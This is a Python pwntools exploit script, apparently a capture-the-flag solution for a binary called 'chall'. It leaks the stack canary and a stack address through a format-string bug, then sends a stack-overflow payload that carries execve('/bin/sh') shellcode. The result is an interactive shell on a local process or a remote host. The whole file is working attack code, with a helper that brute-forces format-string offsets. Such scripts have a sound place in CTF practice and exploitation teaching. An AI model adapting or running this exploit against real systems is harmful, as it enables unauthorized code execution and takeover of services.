from pwn import *
import sys

BINARY = "chall"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def get_leaked_stack(self) -> int:
        p = self.p
        p.recvuntil(b"This might help you out: ")
        return eval(p.recvline())

    def format_string(self, content):
        p = self.p
        p.sendline(content+b"|")
        return p.recvuntil(b"|")[:-1]
    
    def get_canary(self):
        canary = self.format_string(b"%15$p")
        canary = eval(canary)
        return canary


def brute(n):
    """
    canary:
        15
    """
    with context.silent:
        for i in range(1, n):
            x, p = init()
            p.recvline()
            fmt = x.format_string(f"%{i}$p".encode())
            print(f"|{i}| {fmt}")
            p.close()


def main():
    x, p = init()

    leaked_stack = x.get_leaked_stack()
    log.info(f"{leaked_stack=:x}")
    x.debug("break *main+151\nc")
    canary = x.get_canary()
    log.info(f"{canary=:x}")
    
    shell = shellcraft.execve("/bin/sh")
    shell = asm(shell)
    
    pay = flat(
        shell,
        cyclic(72-(len(shell))),
        canary,
        0,
        leaked_stack,
    )
    p.sendline(pay)

    p.interactive()


# brute(100)
main()
